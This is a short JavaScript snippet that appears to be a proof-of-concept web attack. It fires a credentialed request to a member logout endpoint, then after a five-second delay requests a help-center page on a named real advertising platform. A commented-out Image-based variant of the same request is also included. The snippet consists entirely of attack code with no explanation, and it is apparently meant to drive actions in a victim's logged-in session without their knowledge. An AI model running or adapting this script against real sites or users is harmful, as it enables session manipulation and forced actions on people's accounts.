let step1=new XMLHttpRequest();
step1.withCredentials=true;
step1.open("GET","/member/logout")
step1.send();
setTimeout(()=>{ 
step1.open("GET","https://advertiser.trafficjunky.com/help-center")
step1.send();},5000)
/*let step2=new Image();
step2.src="https://advertiser.trafficjunky.com/help-center"*/
